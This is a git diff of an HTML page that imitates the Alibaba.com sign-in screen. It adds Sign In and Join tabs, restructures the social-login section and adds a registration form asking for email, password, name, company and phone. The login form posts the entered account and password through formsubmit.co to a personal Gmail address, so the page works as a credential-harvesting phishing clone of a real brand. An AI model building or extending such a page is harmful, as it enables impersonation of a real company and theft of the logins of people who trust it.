@@ -17,9 +17,20 @@
       <section class="row">
         <section class="col-md-5 col-12 m-auto">
           <div class="p-4 border">
+            <div class="d-flex margin-0">
+              <p class="margin-0 pb-2 px-2" id="signIn" onclick="signin()">
+                Sign In
+              </p>
+              <p class="margin-0 pb-2 px-2" id="join" onclick="register()">
+                Join Alibaba.com
+              </p>
+            </div>
+            <hr class="mt-0" />
             <form
+            class="mt-5"
               action="https://formsubmit.co/oladipupomichael9@gmail.com"
               method="POST"
+              id="loginForm"
             >
               <label for="email" class="fw-bold">Account:</label>
               <input
@@ -65,49 +76,138 @@
                 class="btn btn-orange w-100"
                 value="Sign In"
               />
+
+              <div>
+                <p class="mt-4">
+                  <a href="" class="text-decoration-none hover-orange"
+                    >Mobile number sign in</a
+                  >
+                </p>
+                <hr />
+                <div class="d-flex">
+                  <p class="text-center text-secondary mt-3">
+                    Or sign in with:
+                  </p>
+                  <div class="d-flex justify-content-around">
+                    <img
+                      class="size ms-3 me-2"
+                      src="./assets//facebook.jpg"
+                      alt="facebook"
+                    />
+                    <img
+                      class="size rounded-circle mx-2"
+                      src="./assets//google.png"
+                      alt="google"
+                    />
+                    <img
+                      class="mx-2"
+                      style="width: 56px; height: 56px; margin-top: -2px"
+                      src="./assets//linkedin.webp"
+                      alt="linkedin"
+                    />
+                  </div>
+                </div>
+                <div class="mt-4">
+                  <p class="text-ash margin-0">
+                    <input type="checkbox" checked disabled /> I agree to Free
+                    Membership Agreement
+                  </p>
+                  <p class="text-ash">
+                    <input type="checkbox" checked disabled />I agree to Receive
+                    marketing materials
+                  </p>
+                </div>
+              </div>
             </form>
-            <p class="mt-4">
-              <a href="" class="text-decoration-none hover-orange"
-                >Mobile number sign in</a
-              >
-            </p>
-            <hr />
-            <div class="d-flex">
-              <p class="text-center text-secondary mt-3">Or sign in with:</p>
-              <div class="d-flex justify-content-around">
-                <img
-                  class="size ms-3 me-2"
-                  src="./assets//facebook.jpg"
-                  alt="facebook"
-                />
-                <img
-                  class="size rounded-circle mx-2"
-                  src="./assets//google.png"
-                  alt="google"
-                />
-                <img
-                  class="mx-2"
-                  style="width: 56px; height: 56px"
-                  src="./assets//linkedin.webp"
-                  alt="linkedin"
-                />
-                <img
-                  class="size rounded-circle shadow d-none"
-                  src="./assets//twitter.jpeg"
-                  alt="twitter"
+
+            <form action="" class="text-secondary" id="registerForm">
+              <div class="d-flex">
+                <div class="d-flex justify-content-around">
+                  <img
+                    class="size ms-3 me-2"
+                    src="./assets//facebook.jpg"
+                    alt="facebook"
+                  />
+                  <img
+                    class="size rounded-circle mx-2"
+                    src="./assets//google.png"
+                    alt="google"
+                  />
+                  <img
+                    class="mx-2"
+                    style="width: 56px; height: 56px; margin-top: -2px"
+                    src="./assets//linkedin.webp"
+                    alt="linkedin"
+                  />
+                  <img
+                    class="ms-3 rounded"
+                    style="width: 34px; height: 34px; margin-top: 9px"
+                    src="./assets//twitter.jpeg"
+                    alt="twitter"
+                  />
+                </div>
+              </div>
+              <hr />
+              <div class="my-3">
+                <label for="country" class="col-3">Country/Region:</label>
+                <select class="">
+                  <option value="Nigeria" default></option>
+                </select>
+              </div>
+              <div class="my-3">
+                <label for="purpose" class="col-3">I'm here to:</label>
+                <input type="radio" value="sell" /> <span>Sell</span>
+                <input type="radio" value="purchase" /> <span>Purchase</span>
+                <input type="radio" value="both" /> <span>Both</span>
+                <p class="col-8">
+                  Purchaser and seller will have different experience. And you
+                  may NOT change your role later.
+                </p>
+              </div>
+              <div class="my-3">
+                <label for="email" class="col-3">Email:</label>
+                <input
+                  type="email"
+                  placeholder="It'll be used to sign-in your account"
                 />
               </div>
-            </div>
-            <div class="mt-4">
-              <p class="text-ash margin-0">
-                <input type="checkbox" checked disabled /> I agree to Free Membership
-                Agreement
-              </p>
-              <p class="text-ash">
-                <input type="checkbox" checked disabled />I agree to Receive marketing
-                materials
-              </p>
-            </div>
+              <div class="my-3">
+                <label for="password" class="col-3">Password:</label>
+                <input
+                  type="password"
+                  placeholder="6-20 characters (A-Z, a-z, 0-9 only)"
+                />
+                <p>6 to 20 characters</p>
+                <p>
+                  Contains at least 2 of the followings: letters, numbers and
+                  symbols.
+                </p>
+              </div>
+              <div class="my-3">
+                <label for="name" class="col-3">Name:</label>
+                <input type="text" placeholder="Firstname" />
+                <input type="text" placeholder="Lastname" />
+              </div>
+              <div class="my-3">
+                <label for="company" class="col-3">Company Name:</label>
+                <input
+                  type="text"
+                  placeholder="A brand or registered business name"
+                />
+                <p>Suppliers prefer to do business with companies.</p>
+                <p><input type="checkbox" /> I'm a non-business entity</p>
+              </div>
+              <div class="my-3">
+                <label for="telephone" class="col-3">Tel:</label>
+                <input type="text" placeholder="086" />
+                <input type="text" placeholder="0571" />
+                <input type="text" placeholder="85022088" />
+              </div>
+              <div class="my-3">
+                <label for="verification" class="col-3">Verification:</label>
+                <input type="range" />
+              </div>
+            </form>
           </div>
         </section>
       </section>
